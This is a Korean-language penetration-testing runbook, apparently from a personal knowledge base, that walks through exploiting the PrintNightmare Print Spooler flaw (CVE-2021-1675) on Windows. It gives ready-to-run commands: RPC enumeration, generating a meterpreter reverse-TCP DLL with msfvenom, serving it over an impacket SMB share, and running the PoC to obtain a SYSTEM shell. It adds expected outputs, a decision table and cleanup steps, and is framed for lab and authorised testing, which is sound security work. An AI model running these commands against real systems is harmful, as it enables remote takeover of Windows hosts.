---
tags:
  - 환경/windows
시작조건: ["Windows Print Spooler RPC 접근 가능", "PrintNightmare 영향 조건 확인"]
필요권한: ["원격 Print Spooler RPC 호출 권한"]
필요조건: ["PoC가 요구하는 Windows credential", "영향받는 Print Spooler", "호환되는 PoC와 Impacket 버전", "SMB payload 경로", "callback listener"]
결과: ["SYSTEM 세션", "원격 코드 실행"]
---

# PrintNightmare 원격 코드 실행

## 한 줄 판단

공격 호스트에서 대상 Windows의 SMB와 Print Spooler 원격 프로시저 호출 인터페이스에 연결할 수 있고 PoC에 필요한 Windows 계정이 있다면, 패치 상태를 확인한 뒤 원격 DLL 로드와 대상 호스트의 SYSTEM 코드 실행을 단계별로 검증한다.

## 사용할 때

- 패치되지 않은 Windows 실습 대상에서 Print Spooler RPC가 노출되었을 때.
- PoC와 종속 Impacket 버전을 격리된 재현 환경에 고정할 수 있을 때.
- Spooler 중단 가능성과 DLL·driver 흔적을 확인했을 때.

## 전제 조건

| 구분 | 조건 | 확인 방법 |
|---|---|---|
| 시작 상태 | 대상 RPC와 SMB 도달성 | `rpcdump.py`와 payload 공유 접근 확인 |
| 필요 권한 | PoC가 요구하는 Windows 인증 | 대상에 대한 인증 성공 확인 |
| 입력·환경 | 영향받는 build·patch와 호환 PoC | 패치 상태, PoC README, Impacket 버전 고정 |

## 실행

### 1. Print RPC 노출 확인

```bash
rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'
```

확인할 출력:

- `[MS-RPRN]` 또는 `[MS-PAR]`.
- 이 출력은 프로토콜 노출이며 취약성 증거가 아니다.

### 2. DLL과 전송 경로 준비

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_HOST> LPORT=<LISTEN_PORT> -f dll -o <PAYLOAD_DIR>/payload.dll
sudo impacket-smbserver -smb2support <SHARE> <PAYLOAD_DIR>
```

동일한 payload와 주소·포트로 [[metasploit]]의 `exploit/multi/handler`를 시작한다.

### 3. PoC 실행

```bash
sudo python3 CVE-2021-1675.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '\\<ATTACK_HOST>\<SHARE>\payload.dll'
```

확인할 출력:

- `Bind OK`, `pDriverPath Found`, `Executing ... payload.dll`.
- listener에 새 세션이 열리고 대상에서 `whoami`가 `nt authority\system`.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `MS-RPRN`·`MS-PAR`만 확인 | Print RPC 노출 | 취약성 미확정 | patch·정책·PoC 호환성 확인 |
| `Bind OK`와 DLL 실행 시도 | RPC 호출과 원격 경로 처리 진행 | 코드 실행 미확정 | SMB 요청과 listener callback 확인 |
| callback 세션과 `nt authority\system` | SYSTEM 원격 코드 실행 성공 | 고권한 세션 확보 | 원복 후 [[고권한 세션 확보 후 후속 판단]] |
| DLL 요청은 있으나 callback 없음 | payload 실행 차단 또는 egress 문제 | 실행 영향 미확정 | AV·아키텍처·주소·포트·egress 분리 |
| Spooler 응답 중단 | 서비스 영향 발생 가능 | 복구 필요 상태 | 추가 실행 중단 후 기준 상태에 맞춰 서비스 복구 |

## 확인할 출력과 권한

- RPC endpoint, PoC `Bind OK`, DLL fetch, callback, `whoami`를 단계별로 구분한다.
- SYSTEM 셸이 실제 대상 호스트에서 열린 경우에만 권한 상승 성공으로 판정한다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 공격 호스트 DLL·SMB share·listener | 악성 payload와 수신 서비스 잔존 | 프로세스·파일·포트 확인 | handler와 SMB server 종료 후 생성한 DLL 삭제 |
| 대상 Print Spooler와 driver 처리 | 서비스 중단 또는 driver 관련 흔적 | 서비스 기준 상태와 이벤트 로그 확인 | 작업 전 상태가 실행 중이었을 때만 서비스 복원 |
| 대상 임시 파일·세션 | payload 흔적과 고권한 세션 | 대상 로그·파일·세션 확인 | 이번 작업에서 생성한 항목만 정리 |

## 관련 도구

- [[msfvenom]]
- [[impacket-smbserver]]
- [[metasploit]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]
